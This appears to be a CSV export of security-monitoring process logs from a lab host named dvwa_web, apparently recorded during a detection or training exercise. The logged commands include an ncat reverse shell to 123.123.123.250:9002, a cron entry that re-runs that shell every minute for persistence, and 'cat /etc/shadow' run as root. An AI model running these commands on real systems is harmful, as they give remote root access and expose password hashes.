@timestamp,agent.hostname,command,cwd,event.ingested,filename,host.hostname,host.id,host.ip,host.mac,host.name,host.os.codename,host.os.family,host.os.kernel,host.os.name,host.os.type,host.os.version,message,sid,tty,uid
"Oct 24, 2022 @ 23:26:16.604",dvwa_web,cat /etc/shadow,/root,"Oct 24, 2022 @ 23:26:17.606",/bin/cat,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256432 tty:(none) cwd:/root filename:/bin/cat]: cat /etc/shadow,256432,(none),0
"Oct 24, 2022 @ 23:26:10.603",dvwa_web,ncat -e /bin/sh 123.123.123.250 9002,/root,"Oct 24, 2022 @ 23:26:10.654",/usr/bin/ncat,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256432 tty:(none) cwd:/root filename:/usr/bin/ncat]: ncat -e /bin/sh 123.123.123.250 9002,256432,(none),0
"Oct 24, 2022 @ 23:26:10.603",dvwa_web,/bin/sh,/root,"Oct 24, 2022 @ 23:26:10.655",/bin/sh,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256432 tty:(none) cwd:/root filename:/bin/sh]: /bin/sh,256432,(none),0
"Oct 24, 2022 @ 23:26:10.603",dvwa_web,whoami,/root,"Oct 24, 2022 @ 23:26:10.655",/usr/bin/whoami,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256432 tty:(none) cwd:/root filename:/usr/bin/whoami]: whoami,256432,(none),0
"Oct 24, 2022 @ 23:26:10.603",dvwa_web,id,/root,"Oct 24, 2022 @ 23:26:10.655",/usr/bin/id,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256432 tty:(none) cwd:/root filename:/usr/bin/id]: id,256432,(none),0
"Oct 24, 2022 @ 23:25:16.597",dvwa_web,sh persistence_script.sh,/exploits/Persistence,"Oct 24, 2022 @ 23:25:17.579",/bin/sh,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Persistence filename:/bin/sh]: sh persistence_script.sh,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:25:16.597",dvwa_web,id -u,/exploits/Persistence,"Oct 24, 2022 @ 23:25:17.579",/usr/bin/id,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Persistence filename:/usr/bin/id]: id -u,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:25:16.597",dvwa_web,crontab -l,/exploits/Persistence,"Oct 24, 2022 @ 23:25:17.579",/usr/bin/crontab,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Persistence filename:/usr/bin/crontab]: crontab -l,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:25:16.597",dvwa_web,grep -v ncat -e /bin/sh 123.123.123.250 9002,/exploits/Persistence,"Oct 24, 2022 @ 23:25:17.579",/bin/grep,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:(none) cwd:/exploits/Persistence filename:/bin/grep]: grep -v ncat -e /bin/sh 123.123.123.250 9002,256075,(none),0
"Oct 24, 2022 @ 23:25:16.597",dvwa_web,crontab -,/exploits/Persistence,"Oct 24, 2022 @ 23:25:17.579",/usr/bin/crontab,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:(none) cwd:/exploits/Persistence filename:/usr/bin/crontab]: crontab -,256075,(none),0
"Oct 24, 2022 @ 23:25:16.597",dvwa_web,crontab -l,/exploits/Persistence,"Oct 24, 2022 @ 23:25:17.579",/usr/bin/crontab,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Persistence filename:/usr/bin/crontab]: crontab -l,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:25:16.597",dvwa_web,/bin/echo */1 * * * * ncat -e /bin/sh 123.123.123.250 9002,/exploits/Persistence,"Oct 24, 2022 @ 23:25:17.580",/bin/echo,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Persistence filename:/bin/echo]: /bin/echo */1 * * * * ncat -e /bin/sh 123.123.123.250 9002,256075,/dev/pts/0,0
"Oct 24, 2022 @ 23:25:16.597",dvwa_web,crontab /tmp/crontab,/exploits/Persistence,"Oct 24, 2022 @ 23:25:17.580",/usr/bin/crontab,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,linux,11 (bullseye),[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Persistence filename:/usr/bin/crontab]: crontab /tmp/crontab,256075,/dev/pts/0,0
